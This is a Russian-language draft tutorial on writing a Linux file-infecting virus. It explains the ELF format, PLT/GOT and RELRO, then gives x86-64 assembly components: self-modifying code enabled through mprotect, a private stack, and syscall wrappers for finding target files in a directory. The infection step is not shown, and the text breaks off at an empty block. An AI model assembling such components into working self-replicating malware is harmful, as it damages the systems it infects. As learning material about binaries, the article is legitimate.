#+STARTUP: showall indent hidestars

Файловый Linux-вирус с нуля: опыт и грабли

* Интро

[TODO:gmm] - КПДВ

Единственное руководство "для новичка" по написанию вирусов, что
мне удалось найти - это "Записки исследователя компьютерных вирусов"
Криса Касперски. Очень увлекательное чтение! Что если попробовать
реализовать пару идей оттуда? Сколько это займет времени для человека,
который ничего подобного раньше не делал? Какие подводные камни?

Так начался проект по написанию моего первого файлового вируса.

-=[cut]=-

Цель этого учебного проекта будет достигнута, если вирус сможет заразить
файлы-мишени.

* План работ:

- пишем мишени
- понимаем формат ELF
- пишем вирус
- ищем файлы
- инфицируем их (если еще не)
- проверяем что зараженные мишени работают
- пишем отчет

* Файлы-мишени

Простейшая мишень (на Си):

#+BEGIN_SRC c :tangle hello.c

  /* gcc hello.c -o hello -ggdb */
  #include <stdio.h>
  #include <time.h>

  time_t rawtime;
  struct tm * timeinfo;

  int main()
  {
      printf( "Hello world!\n" );
      time ( &rawtime );
      timeinfo = localtime ( &rawtime );
      printf ( "Current local time and date: %s", asctime (timeinfo) );
      return 0;
  }

#+END_SRC

С++ вариант:

#+BEGIN_SRC cpp :tangle hello.cpp

  /* src: https://gist.github.com/ofan/721464 */
  /* g++ hello.cpp -o hellocpp -ggdb */
  #include <iostream>
  #include <sstream>
  #include <string>
  #include <vector>
  #include <list>
  #include <map>
  #include <stdlib.h>

  // return given mumber as a string
  std::string str(long n) { std::ostringstream os; os << n; return os.str(); }

  // return true iff given character is '0'..'9'
  bool isdig(char c) { return isdigit(static_cast<unsigned char>(c)) != 0; }


  ////////////////////// cell

  enum cell_type { Symbol, Number, List, Proc, Lambda };

  struct environment; // forward declaration; cell and environment reference each other

  // a variant that can hold any kind of lisp value
  struct cell {
      typedef cell (*proc_type)(const std::vector<cell> &);
      typedef std::vector<cell>::const_iterator iter;
      typedef std::map<std::string, cell> map;
      cell_type type; std::string val; std::vector<cell> list; proc_type proc; environment * env;
      cell(cell_type type = Symbol) : type(type), env(0) {}
      cell(cell_type type, const std::string & val) : type(type), val(val), env(0) {}
      cell(proc_type proc) : type(Proc), proc(proc), env(0) {}
  };

  typedef std::vector<cell> cells;
  typedef cells::const_iterator cellit;

  const cell false_sym(Symbol, "#f");
  const cell true_sym(Symbol, "#t"); // anything that isn't false_sym is true
  const cell nil(Symbol, "nil");


  ////////////////////// environment

  // a dictionary that (a) associates symbols with cells, and
  // (b) can chain to an "outer" dictionary
  struct environment {
      environment(environment * outer = 0) : outer_(outer) {}

      environment(const cells & parms, const cells & args, environment * outer)
          : outer_(outer)
      {
          cellit a = args.begin();
          for (cellit p = parms.begin(); p != parms.end(); ++p)
              env_[p->val] = *a++;
      }

      // map a variable name onto a cell
      typedef std::map<std::string, cell> map;

      // return a reference to the innermost environment where 'var' appears
      map & find(const std::string & var)
      {
          if (env_.find(var) != env_.end())
              return env_; // the symbol exists in this environment
          if (outer_)
              return outer_->find(var); // attempt to find the symbol in some "outer" env
          std::cout << "unbound symbol '" << var << "'\n";
          exit(1);
      }

      // return a reference to the cell associated with the given symbol 'var'
      cell & operator[] (const std::string & var)
      {
          return env_[var];
      }

  private:
      map env_; // inner symbol->cell mapping
      environment * outer_; // next adjacent outer env, or 0 if there are no further environments
  };


  ////////////////////// built-in primitive procedures

  cell proc_add(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i) n += atol(i->val.c_str());
      return cell(Number, str(n));
  }

  cell proc_sub(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i) n -= atol(i->val.c_str());
      return cell(Number, str(n));
  }

  cell proc_mul(const cells & c)
  {
      long n(1);
      for (cellit i = c.begin(); i != c.end(); ++i) n *= atol(i->val.c_str());
      return cell(Number, str(n));
  }

  cell proc_div(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i) n /= atol(i->val.c_str());
      return cell(Number, str(n));
  }

  cell proc_greater(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i)
          if (n <= atol(i->val.c_str()))
              return false_sym;
      return true_sym;
  }

  cell proc_less(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i)
          if (n >= atol(i->val.c_str()))
              return false_sym;
      return true_sym;
  }

  cell proc_less_equal(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i)
          if (n > atol(i->val.c_str()))
              return false_sym;
      return true_sym;
  }

  cell proc_length(const cells & c) { return cell(Number, str(c[0].list.size())); }
  cell proc_nullp(const cells & c)  { return c[0].list.empty() ? true_sym : false_sym; }
  cell proc_car(const cells & c)    { return c[0].list[0]; }

  cell proc_cdr(const cells & c)
  {
      if (c[0].list.size() < 2)
          return nil;
      cell result(c[0]);
      result.list.erase(result.list.begin());
      return result;
  }

  cell proc_append(const cells & c)
  {
      cell result(List);
      result.list = c[0].list;
      for (cellit i = c[1].list.begin(); i != c[1].list.end(); ++i) result.list.push_back(*i);
      return result;
  }

  cell proc_cons(const cells & c)
  {
      cell result(List);
      result.list.push_back(c[0]);
      for (cellit i = c[1].list.begin(); i != c[1].list.end(); ++i) result.list.push_back(*i);
      return result;
  }

  cell proc_list(const cells & c)
  {
      cell result(List); result.list = c;
      return result;
  }

  // define the bare minimum set of primintives necessary to pass the unit tests
  void add_globals(environment & env)
  {
      env["nil"] = nil;   env["#f"] = false_sym;  env["#t"] = true_sym;
      env["append"] = cell(&proc_append);   env["car"]  = cell(&proc_car);
      env["cdr"]    = cell(&proc_cdr);      env["cons"] = cell(&proc_cons);
      env["length"] = cell(&proc_length);   env["list"] = cell(&proc_list);
      env["null?"]  = cell(&proc_nullp);    env["+"]    = cell(&proc_add);
      env["-"]      = cell(&proc_sub);      env["*"]    = cell(&proc_mul);
      env["/"]      = cell(&proc_div);      env[">"]    = cell(&proc_greater);
      env["<"]      = cell(&proc_less);     env["<="]   = cell(&proc_less_equal);
  }


  ////////////////////// eval

  cell eval(cell x, environment * env)
  {
      if (x.type == Symbol)
          return env->find(x.val)[x.val];
      if (x.type == Number)
          return x;
      if (x.list.empty())
          return nil;
      if (x.list[0].type == Symbol) {
          if (x.list[0].val == "quote")       // (quote exp)
              return x.list[1];
          if (x.list[0].val == "if")          // (if test conseq [alt])
              return eval(eval(x.list[1], env).val == "#f" ? (x.list.size() < 4 ? nil : x.list[3]) : x.list[2], env);
          if (x.list[0].val == "set!")        // (set! var exp)
              return env->find(x.list[1].val)[x.list[1].val] = eval(x.list[2], env);
          if (x.list[0].val == "define")      // (define var exp)
              return (*env)[x.list[1].val] = eval(x.list[2], env);
          if (x.list[0].val == "lambda") {    // (lambda (var*) exp)
              x.type = Lambda;
              // keep a reference to the environment that exists now (when the
              // lambda is being defined) because that's the outer environment
              // we'll need to use when the lambda is executed
              x.env = env;
              return x;
          }
          if (x.list[0].val == "begin") {     // (begin exp*)
              for (size_t i = 1; i < x.list.size() - 1; ++i)
                  eval(x.list[i], env);
              return eval(x.list[x.list.size() - 1], env);
          }
      }
      // (proc exp*)
      cell proc(eval(x.list[0], env));
      cells exps;
      for (cell::iter exp = x.list.begin() + 1; exp != x.list.end(); ++exp)
          exps.push_back(eval(*exp, env));
      if (proc.type == Lambda) {
          // Create an environment for the execution of this lambda function
          // where the outer environment is the one that existed* at the time
          // the lambda was defined and the new inner associations are the
          // parameter names with the given arguments.
          // *Although the environmet existed at the time the lambda was defined
          // it wasn't necessarily complete - it may have subsequently had
          // more symbols defined in that environment.
          return eval(/*body*/proc.list[2], new environment(/*parms*/proc.list[1].list, /*args*/exps, proc.env));
      }
      else if (proc.type == Proc)
          return proc.proc(exps);

      std::cout << "not a function\n";
      exit(1);
  }


  ////////////////////// parse, read and user interaction

  // convert given string to list of tokens
  std::list<std::string> tokenize(const std::string & str)
  {
      std::list<std::string> tokens;
      const char * s = str.c_str();
      while (*s) {
          while (*s == ' ')
              ++s;
          if (*s == '(' || *s == ')')
              tokens.push_back(*s++ == '(' ? "(" : ")");
          else {
              const char * t = s;
              while (*t && *t != ' ' && *t != '(' && *t != ')')
                  ++t;
              tokens.push_back(std::string(s, t));
              s = t;
          }
      }
      return tokens;
  }

  // numbers become Numbers; every other token is a Symbol
  cell atom(const std::string & token)
  {
      if (isdig(token[0]) || (token[0] == '-' && isdig(token[1])))
          return cell(Number, token);
      return cell(Symbol, token);
  }

  // return the Lisp expression in the given tokens
  cell read_from(std::list<std::string> & tokens)
  {
      const std::string token(tokens.front());
      tokens.pop_front();
      if (token == "(") {
          cell c(List);
          while (tokens.front() != ")")
              c.list.push_back(read_from(tokens));
          tokens.pop_front();
          return c;
      }
      else
          return atom(token);
  }

  // return the Lisp expression represented by the given string
  cell read(const std::string & s)
  {
      std::list<std::string> tokens(tokenize(s));
      return read_from(tokens);
  }

  // convert given cell to a Lisp-readable string
  std::string to_string(const cell & exp)
  {
      if (exp.type == List) {
          std::string s("(");
          for (cell::iter e = exp.list.begin(); e != exp.list.end(); ++e)
              s += to_string(*e) + ' ';
          if (s[s.size() - 1] == ' ')
              s.erase(s.size() - 1);
          return s + ')';
      }
      else if (exp.type == Lambda)
          return "<Lambda>";
      else if (exp.type == Proc)
          return "<Proc>";
      return exp.val;
  }

  // the default read-eval-print-loop
  void repl(const std::string & prompt, environment * env)
  {
      for (;;) {
          std::cout << prompt;
          std::string line; std::getline(std::cin, line);
          std::cout << to_string(eval(read(line), env)) << '\n';
      }
  }

  int main ()
  {
      environment global_env; add_globals(global_env);
      repl("90> ", &global_env);
  }

#+END_SRC

* Понимаем формат ELF

Разберемся, как устроен ELF внутри.

** Сегменты и секции

После компиляции мы получаем ELF-файл. Он очень просто устроен: таблица
сегментов хранит записи с указателями на сегменты, таблица секций -
записи с указателями на секции в этих сегментах, а заголовок эльфа
содержит информацию, где найти обе эти таблицы в файле, сколько в них
записей, точку входа и т.д.:

#+NAME: elf
#+BEGIN_SRC ditaa :file ./img/elf.png
           +-------------------------------+
           | Заголовок ELF-файла           |
           | (ELF-header)                  |
           |                               |
           |   Phdr Table Offset >---------+----+
  +--------+-< Shdr Table Offset           |    |
  |        |        ...                    |    |
  |        +-------------------------------+    |
  |                                             |
  |        +-------------------------------+<---+
  |        | Таблица сегментов             |
  |        | (Program Header Table)        |
  |        |     1                         |
  |   +----+---< 2                         |
  |   |    |     ...                       |
  |   |    +-------------------------------+
  |   |
  |   |    +-------------------------------+
  |   |    | Segment 1 | Section A         |
  |   |    |           +-------------------|
  |   |    |           | Section B         |
  |   |    |           +-------------------|
  |   |    |           |      ...          |
  |   |    +-------------------------------+
  |   +--> +-------------------------------+
  |        | Segment 2 | Section C         |
  |        |           +-------------------|<---+
  |        |           | Section D         |    |
  |        |           +-------------------|    |
  |        |           |      ...          |    |
  |        +-------------------------------+    |
  |                                             |
  +------->+-------------------------------+    |
           | Таблица заголовков секций     |    |
           | (Section Header Table)        |    |
           |                         A     |    |
           |                         B     |    |
           |                         C     |    |
           |                         D >---+----+
           |                         ...   |
           +-------------------------------+
#+END_SRC

#+results: elf
[[file:./img/elf2.png]]

Интересно, что каждый сегмент, содержит внутри себя одну или несколько
секций. В документации указано, что таблица заголовков секций
необязательна, и чтобы проверить это, мы можем ее удалить. Для этого
лучше использовать утилиту ~sstrip~ из ELF Kickers, которую можно взять
тут: http://www.muppetlabs.com/%7Ebreadbox/software/elfkickers.html

Воспользовавшись ей получаем:

#+BEGIN_SRC sh
  $ sstrip hello
  $ readelf -S test_sect_tbl

  There are no sections in this file.

  $ ./hello
  Hello world
#+END_SRC

Действительно, Section Header Table не нужна, чтобы наш hello world мог
загрузиться и выполниться! Но сами секции внутри сегментов никуда не
делись, мы просто потеряли информацию о них. Настало время поговорить о
сегментах.

Можно ожидать, что наша простая мишень будет иметь два сегмента - один
для кода, а второй для данных. Но ELF-ы умеют превосходить ожидания:

#+BEGIN_SRC sh
  $ readelf -l hello

  Elf file type is DYN (Shared object file)
  Entry point 0x10e0
  There are 13 program headers, starting at offset 64

  Program Headers:
    Type           Offset             VirtAddr           PhysAddr
                   FileSiz            MemSiz              Flags  Align
    PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                   0x00000000000002d8 0x00000000000002d8  R      0x8
    INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
                   0x000000000000001c 0x000000000000001c  R      0x1
        [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
    LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                   0x00000000000006e0 0x00000000000006e0  R      0x1000
    LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                   0x00000000000002b5 0x00000000000002b5  R E    0x1000
    LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                   0x0000000000000188 0x0000000000000188  R      0x1000
    LOAD           0x0000000000002d98 0x0000000000003d98 0x0000000000003d98
                   0x0000000000000278 0x0000000000000290  RW     0x1000
    DYNAMIC        0x0000000000002da8 0x0000000000003da8 0x0000000000003da8
                   0x00000000000001f0 0x00000000000001f0  RW     0x8
    NOTE           0x0000000000000338 0x0000000000000338 0x0000000000000338
                   0x0000000000000020 0x0000000000000020  R      0x8
    NOTE           0x0000000000000358 0x0000000000000358 0x0000000000000358
                   0x0000000000000044 0x0000000000000044  R      0x4
    GNU_PROPERTY   0x0000000000000338 0x0000000000000338 0x0000000000000338
                   0x0000000000000020 0x0000000000000020  R      0x8
    GNU_EH_FRAME   0x0000000000002038 0x0000000000002038 0x0000000000002038
                   0x0000000000000044 0x0000000000000044  R      0x4
    GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                   0x0000000000000000 0x0000000000000000  RW     0x10
    GNU_RELRO      0x0000000000002d98 0x0000000000003d98 0x0000000000003d98
                   0x0000000000000268 0x0000000000000268  R      0x1

   Section to Segment mapping:
    Segment Sections...
     00
     01     .interp
     02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt
     03     .init .plt .plt.got .plt.sec .text .fini
     04     .rodata .eh_frame_hdr .eh_frame
     05     .init_array .fini_array .dynamic .got .data .bss
     06     .dynamic
     07     .note.gnu.property
     08     .note.gnu.build-id .note.ABI-tag
     09     .note.gnu.property
     10     .eh_frame_hdr
     11
     12     .init_array .fini_array .dynamic .got
#+END_SRC

Что это? Вместо ожидаемых двух сегментов, мы получили это! Давайте
разбираться:

~PHDR-сегмент~ описывает саму Program Header Table. Мы видим, что он
начинается по смещению 0x40 байт от начала файла, сразу после
ELF-заголовка.

~INTERP-сегмент~ описывает "Program Interpreter" - это указатель на
строку (в секции .strtab), содержающую путь к динамическому
компоновщику. Этот сегмент содержит одну секцию .interp

~LOAD-сегмент-R~ - это первый LOAD-сегмент в файле. Он содержит несколько
секций, и первая из них - это .interp - мы ее только что видели в
предыдущем сегменте. Все LOAD-сегменты загружаются в память, когда
программа запускается. Первый LOAD-сегмент начинается с нулевого адреса,
значит он загружает в память все содержимое файла от его начала до
следующего LOAD-сегмента, который обычно содержит код. Это содержимое
будет доступно программе НА ЧТЕНИЕ.

~LOAD-сегмент-RE~ содержит код в секции .text, а в остальных своих
секциях все что к нему относится, например, .init и .fini, а также
секции, которые связаны с GOT и PLT (.plt, .plt.got,
.plt.sec). Содержимое эттого сегмента будет загружено с правами НА ЧТЕНИЕ
И ИСПОЛНЕНИЕ.

~LOAD-сегмент-R~ обычно содержит в себе данные, которые будут доступны
только НА ЧТЕНИЕ, например в секции .rodata и также может содержать в
себе секции вида .eh_frame относящиеся к обработке ислючений.

~LOAD-сегмент-RW~ содержит данные, доступные НА ЧТЕНИЕ И ЗАПИСЬ (в
секциях .data, .bss, .init_array, .fini_array и. т. п.), секции,
связанные с GOT (.got)

~DYNAMIC-сегмент~ содержит одну секцию .dynamic - в ней лежит информация,
имеющая отношение к релокациям. Эта секция тоже доступна НА ЧТЕНИЕ И
ЗАПИСЬ.

~NOTE-сегменты~ имеет тип NOTE, мы можем просмотреть его с помощью
"readelf -n" и обычно там нет ничего интересного.

~GNU_ сегменты~ содержат таблицы для обработки исключений, стек и таблицы
связанные с релокациями

Все это вместе выглядит как-то так:

#+NAME: elf
#+BEGIN_SRC ditaa :file ./img/elf2.png
  +----------------------------+
  | Заголовок ELF-файла        |
  | (ELF-header)               |
  +----------------------------+

  +----------------------------+
  |Таблица заголовков сегментов|
  | (Program Header Table)     |
  +----------------------------+

  +----------------------------+
  | Segment (PHDR)             |
  +----------------------------+
  | Segment (INTERP)           |
  |    .interp                 |
  +----------------------------+
  | Segment (LOAD) R           |
  |    .interp                 |
  |      ...                   |
  +----------------------------+
  | Segment (LOAD) RE          |
  |    .text                   |
  |      ...                   |
  +----------------------------+
  | Segment (LOAD) R           |
  |      ...                   |
  +----------------------------+
  | Segment (LOAD) RW          |
  |      ...                   |
  +----------------------------+
  | Segment (DYNAMIC) RW       |
  |   .dynamic                 |
  +----------------------------+
  | Segment (NOTE)             |
  |     ...                    |
  +----------------------------+
  | Segment (GNU_...)          |
  |     ...                    |
  +----------------------------+

  +----------------------------+
  | Таблица заголовков секций  |
  | (Section Header Table)     |
  +----------------------------+
#+END_SRC

В этом прослеживается некоторая логика - все данные распределены по
секциям, а секции скомпонованы в сегменты в соответствии с правами
доступа к этим данным. Некоторые секции могут относиться к нескольким
сегментам одновременно - стоит это учитывать.

** PLT и GOT

Большинство серьезных программы используют разделяемые библиотеки,
которые связываются динамически. Рассмотрим подробнее этот
механизм. Когда программе нужно вызвать функцию разделяемой библиотеки,
она делает вызов в специальную Таблицу Связи Процедур (PLT - Procedure
Linkage Table).

Каждая запись этой таблицы содержит небольшой кусочек кода, который
выполняет коссвенный вызов нужной функции разделямой библиотеки. Этот
вызов коссвенный, потому что программа не знает адрес, где будет
находиться библиотека, ведь загрузчик программ каждый раз загружает
библиотеки в адресное пространство процесса по случайным адресам.

Чтобы узнать реальный адрес, кусочек кода из PLT должен обратиться к
Глобальной Таблице Смещений (GOT - Global Offset Table). Динамический
линкер заботится о том, чтобы там были были правильные значения.

Как он это делает?

При первом вызове функции GOT содержит указатель обратно на PLT, где
вызывается динамический компоновщик для определения фактического
местоположения рассматриваемой функции. Найденное местоположение затем
записывается в GOT. При втором вызове функции GOT уже содержит известное
местоположение функции. Это называется «ленивое связывание».

Таким образом, мы видим, что PLT должна иметь права на исполнение, а
GOT - на запись, потому что связывание динамическим линкером выполняется
лениво, т.е. прямо во время работы программы, при первой попытке доступа
к соответствующей функции.

Из вышесказанного можно сделать несколько выводов:
- Во-первых, код должен знать, как найти PLT. Это значит PLT размещается
  по фиксированному адресу, либо (если мы говорим о
  позиционно-независимом коде) с фиксированным смещением от .text
- Во-вторых, поскольку GOT содержит данные, напрямую используемые
  различными частями программы, его (тоже) необходимо разместить по
  фиксированному адресу в памяти.

Компилятор GCC размещает PLT выше .text, а GOT-ниже данных. Я не знаю
почему он так делает, но возможно потому, что это создает нам проблемы:
ведь если мы попытаемся вставить что-то между PLT и GOT, то все ссылки
между ними окажутся сломанными и мы получим сегфолт.

Кроме того, мы не можем позволить себе сдвигать .data, потому что на
адреса в .data ссылается код из .text:

#+NAME: got_plt
#+BEGIN_SRC ditaa :file ./img/got_plt.png
        +-------------------+
        | Segment (LOAD) RE |
        |                   |
        +-------------------+
        | ...               |
        +-------------------+
  +-----| Section .PLT      |<---+
  |     +-------------------+    |
  |     | Section .TEXT     |----+
  |     |                   |----+
  |     +-------------------+    |
  |     | ...               |    |
  |     +-------------------+    |
  |                              |
  |     +-------------------+    |
  |     | Segment (LOAD) RW |    |
  |     |                   |    |
  |     +-------------------+    |
  |     | ...               |    |
  |     +-------------------+    |
  +---->| Section .GOT      |    |
        +-------------------+    |
        | Section .DATA     |<---+
        +-------------------+
        | ...               |
        +-------------------+
#+END_SRC

*** RelRO

Может присутствовать еще один механизм защиты, называющийся RELRO.

Поскольку GOT существует в заранее определенном месте в памяти, если
программа содержит уязвимость, позволяющую злоумышленнику записать
несколько байт в контролируемое место в памяти, то это может быть
использовано для выполнения произвольного кода - атакующий может заменить
адрес в записи GOT, чтобы выполнить нужный ему код.

Защита, которую строит компилятор основана на том что компоновщик
разрешает все динамически связанные функции в начале выполнения, а затем
делает GOT доступным только для чтения. Этот метод называется RELRO и
гарантирует, что GOT не может быть перезаписан во время выполнения.

В частичном RELRO секция .got доступна только для чтения, но .got.plt все
еще доступен для записи. В то время как в полном RELRO и .got и .got.plt
помечен как доступен только для чтения.

И частичное, и полное RELRO изменяют порядок внутренних разделов данных
ELF, чтобы защитить их от перезаписи в случае переполнения буфера.

** TODO Релокейты

[TODO:gmm] По-видимому, придется всю теорию, связаную с релокейтами
поместить сюда.

* Базовые принципы

Нужно сделать так, чтоб код вируса было относительно легко переписывать
из файла в файл, - желательно, чтобы код был как можно меньше.

К тому же, хорошо бы, чтоб вирус не зависел ни от каких библиотек,
поскольку в противном случае переносить его и обеспечивать его коррктную
работу становится значительно труднее. [TODO:gmm] - это самоочевидно, нет?

Учитывая эти факторы, наиболее удобным языком реализации является GNU
ассемблер. Для человека, который привык к синтаксису Intel, GNU asm
кажется совершенно наркоманским из-за аргументов, которые идут в обратном
порядке (сначала источник, потом приемник), но к нему быстро
привыкаешь. [TODO:gmm] - Мы же договорились выкинуть это словоблудие?

Необходимо, чтобы код и данные вируса находилось в секции .text, иначе
очень сложно урегулировать все ссылки.

** Разрешаем писать в сегмент кода

Используем вызов mprotect. Изменив права для страницы памяти, на
которой располагается код вируса, с чтение/исполнение на
чтение/исполнение/запись, мы разрешаем себе писать в код.

Мы загружаем адрес метки start, которая является началом вируса, и
выравниваем этот адрес по 4 кб, потому что mprotect может разрешить
изменение атрибутов только сначала страницы.

Так же mprotect надо сообщить размер памяти, для которой она выставляет
новые атрибуты. Поэтому мы загружаем адрес метки fin, которая находится в
самом конце вируса, и вычитаем из этой метки полученный выровненный
адрес. Если всё прошло хорошо, то mprotect вернет 0.

В противном случае мы выведем сообщение об ошибке и выйдем из вируса с
помощью макроса ERR_MSG.

#+NAME: _allow_write_into_code
#+BEGIN_SRC asm
  /// Разрешает коду вируса писать
  /// в самого себя
  _allow_write_into_code:
      push    %rdx
      push    %rcx
      push    %rdi
      push    %rsi

      lea     _start(%rip), %rdi
      and     $~0xFFF, %rdi       # ..in %RDI
      lea     _fin_infector(%rip), %rsi   # get end addr

      sub     %rdi, %rsi          # total size - %RSI
      mov     $0x7, %rdx          # RW+EXEC flags - $RDX
      mov     $0xA, %rax          # mprotect handle
      syscall

      test    %rax, %rax
      jne     _allow_write_into_code_error

      mov     %rax, mprotect_ok(%rip)
  _allow_write_into_code_exit:
      pop     %rsi
      pop     %rdi
      pop     %rcx
      pop     %rdx

      ret

      ERR_MSG _allow_write_into_code "mprotect in _start"

#+END_SRC

Вот так реализуется макрос:

#+NAME: _debug_msg
#+BEGIN_SRC asm
  /// Если эта переменная существует,
  /// макросы будут генерировать отладочный вывод

      .set DEBUG_MODE, 1

      // Макрос для генерации сообщений об ошибках

      .macro ERR_MSG name msg
          .ifdef DEBUG_MODE
              \name\()_error:
                  lea     \name\()_msg_e(%rip), %rsi
                  mov     $len_e_\name, %rdx
                    jmp     _error_msg
              \name\()_msg_e:
                  .ascii "ERR: \msg\()\n"
                  .set len_e_\name, . - \name\()_msg_e
          .else
              \name\()_error:
                  jmp     \name\()_exit
          .endif
      .endm

  /// печать сообщения об ошибке и выход
  /// из программы
  _error_msg:
      .ifdef DEBUG_MODE
      call    _my_write
      .endif
      jmp    _restore_registers_and_stack

#+END_SRC

Если мы находимся в дебаг-режиме, а мы в нем находимся по умолчанию, то
код, в который раскроется макрос, выведет заданное сообщение об ошибке, а
затем выйдет из вируса.

** Настраиваем стек для вируса

[TODO:gmm] - Ты говоришь выше, что вирус должен быть маленький, а потом
выделяешь 6000 байт прямо внутри .text - может быть есть вариант поэлегантнее?

Если мы не используем библиотеки, то нам придется настроить стек
вручную. Самый простой путь - это выделить память и установить в
регистр rsp - этот регистр указывает на вершину стека -
адрес-указатель на последние 8 байт этой памяти.

Сначала зарезервируем память. Мы рассчитываем, что 6 тыс. байт хватит на
все.

#+NAME: _my_stack
#+BEGIN_SRC asm

  _stack_top:
      .space 6000, 0

  _stack_bottom:
      .quad 0

#+END_SRC

Поскольку стек растет в сторону меньших адресов - то есть если в него
что-то запушить, то адрес в rsp уменьшится, а не увеличится - положим в
rsp адрес _stack_bottom, поскольку он больше. Больше ничего делать не
нужно, поскольку push и pop - запушить что-то в стек и снять что-то
снего - сделают всю работу за нас. Не забываем сохранить старое значение
RSP - оно нам понадобится, когда вирус закончит свою работу и передаст
управление коду мишени.

#+NAME: _set_rsp
#+BEGIN_SRC asm :noweb yes

      mov     %rsp, old_rsp(%rip)
      lea     _stack_bottom(%rip), %rsp

#+END_SRC

** Обертка для write

Нам однозначно придется выводить строки во время отладки, поэтому
реализуем вызов write. Его параметры - это указатель на строку и ее
длина - должны находиться в регистрах rdi и rsi.
Вывод всегда будет в stdout.


#+NAME: _my_write
#+BEGIN_SRC asm

  /// WRITE TO STDOUT
  /// @PARAMS
  ///   - %RSI - msg pointer
  ///   - %RDX - msg size
  _my_write:
      mov      $0x1, %rax          # write
      mov      %rax, %rdi          # to stdout
      syscall
      ret

#+END_SRC

** strlen

Нам нужна длина строки, поэтому сделаем strlen (без syscall).  Функция
принимает указатель на строку в регистре rdi и проходится по нес с
помощью ~repne scasb~ до тех пор, пока не встретит 0, который
интерпретируется как конец строки.  Счетчиком символов выступает регистр
rcx, в который мы кладем число 0x64. Вряд ли мы будем печатать строку
длиной более 100 символов ([TODO:gmm] - это такое себе допущение), так
что счетчика должно хватить. Затем мы смотрим, насколько уменьшилось
число в rcx - это и будет длина строки.

#+NAME: _my_strlen
#+BEGIN_SRC asm

  /// _MY_STRLEN
  /// PARAMS -
  /// RDI - указатель на строку
  /// Изменяет STRING_LENGTH
  _my_strlen:
      xor     %rax, %rax

      push    %rcx
      push    %rbx

      test    %rdi, %rdi
      je      _my_strlen_fail
      // je      _my_strlen_error

      mov     $0x64, %rcx
      repne   scasb

      mov     $0x64, %rbx
      sub     %rcx, %rbx
      mov     %rbx, %rax
      dec     %rax

      mov     %rax, string_length(%rip)
      xor     %rax, %rax

      jmp    _my_strlen_exit

  _my_strlen_fail:
      mov     $-1, %rax

  _my_strlen_exit:
      pop     %rbx
      pop     %rcx

      ret

      ERR_MSG _my_strlen "_my_strlen: NULL pointer"

#+END_SRC

** Обертки open и close

Очевидно, что придется открывать и закрывать файлы. Системные вызовы open
и close, которые этим занимаются, реализовать совсем просто.
Вызов open принимает единственный параметр в регистре rdi - указатель на
имя файла. Это код настолько маленький, что мы даже не будем его выносить
в отдельную функцию.

#+NAME: _my_open
#+BEGIN_SRC asm

      mov     $0x2, %rax  # open syscall
      syscall

#+END_SRC

Системный вызов close реализуется так же просто. Его параметр в rdi - это
файловый дескриптор открытого файла, который нужны закрыть.

[TODO:gmm] Было бы неплохо номера системных вызовов вынести в константы
времени компиляции.

#+NAME: _my_close
#+BEGIN_SRC asm

      mov     $0x3, %rax  # close syscall
      syscall

#+END_SRC

** readdir

В начале этой статьи была обозначена цель: вирус должен заражать файлы в
текущей папке. Следовательно, он должен каким-то образом получать доступ
к их именам.

В этом нам поможет реализация readdir.

~readdir~ работает следующим образом: она открывает заданную директорию (
у нас она указана в переменной ~dir_name~) и вызывает системный вызов
~getdents~, который считает все записи из каталога в буфер ~dir_buf~.
Таким образом мы получаем структуры записей всех файлов и папок в
заданном каталоге. В каждой такой структуре содержится и имя файла.
Так же мы сохраним указатель на первую структуру в буфере - это позволит
сдвигать указатель на следующую структуру файла, чтоб добыть его имя,
если предыдущий файл не подошел для заражения по какой-то причине.

#+NAME: _my_readdir
#+BEGIN_SRC asm

  /// Открывает директорию
  /// и считывает все ее записи в буфер
  _my_readdir:
      push    %rdi
      push    %rsi
      push    %rbx

      // открыть директорию
      lea     dir_name(%rip), %rdi
      mov     $0x0, %rsi
      mov     $0x2, %rax  # fopen syscall
      syscall
      test     %rax, %rax
      jl      _my_readdir_open_error

      // заполянем структуру потока
      lea     dir_struct(%rip), %rbx
      mov     %eax, (%rbx)
      movq    $0x8000, 0x8(%rbx) # размер буфера


      // параметры getdents
      mov     (%rbx), %rdi
      lea     dir_buf(%rip), %rsi
      mov     8(%rbx), %rdx

      // вызов getdents
      mov    $0x4e, %rax
      syscall

      // в случае успеха возвращ.
      // кол-во считанных байт
      // иначе 0
      cmp     $0x0, %rax
      jle     _my_readdir_read_error

      // сохранили указатель на первую структуру
      // в буфере
      lea     dir_buf_ptr(%rip), %rbx
      mov     %rsi, (%rbx)

      xor     %rax, %rax
      pop     %rbx
      pop     %rsi
      pop     %rdi
      ret

      ERR_MSG _my_readdir_open "_my_readdir: Can't open directory"
      ERR_MSG _my_readdir_read "_my_readdir: Can't read directory"

#+END_SRC

** Обертка для stat

Нам часто нужно будет узнавать свойства файла - например, его
размер. Добиться этого возможно с помощью stat.

#+NAME: _my_stat
#+BEGIN_SRC asm

/// MY_STAT
/// @PARAMS
/// %RDI - file name
/// %RSI - stat struct pointer
_my_stat:
    push    %rcx
    mov     $0x04, %rax

    syscall

    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop     %rcx
    ret

    ERR_MSG _my_stat "my_stat"

#+END_SRC

Мы реализауем еще некоторые библиотечные функции, но они будут показаны
позже, в контексте идеи инфицирования.

** Обертка для exit
Поскольку мы не используем библиотеки, придется убивать текущий процесс
вручную. В этом нам поможет системный взов ~exit~.

** Вот его реализация

#+NAME: _global_exit
#+BEGIN_SRC asm

